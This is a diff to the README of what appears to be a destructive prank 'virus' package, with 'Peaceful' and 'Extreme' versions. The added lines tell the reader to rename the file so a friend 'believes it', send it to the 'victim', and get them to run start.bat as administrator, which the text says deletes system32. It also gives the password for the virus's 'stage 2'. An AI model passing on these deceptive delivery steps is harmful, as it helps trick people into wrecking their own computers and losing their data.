@@ -14,7 +14,8 @@ download the file "Your file name (Paceful version)" (the file read me this is j
 
 Extreme version
 
-download the file "Your file name (Extreme version)" (the file read me this is just to get the victim's attention don't do this tutorial) rename the file as you like, and rename the label fil as you like, so that your friend believes it, send it to him and make him run the label file by admin
+download the file "Your file name (Extreme version)" (the file read me this is just to get the victim's attention don't do this tutorial) rename the file as you like so that your friend believes it, send it to him and make him run the start.bat file ONLY BY ADMIN!!!!
+(If you don`t run start.bat by admin system32 has not be deleted)
 
 (The password in stage 2 of the virus is really 1231)
 
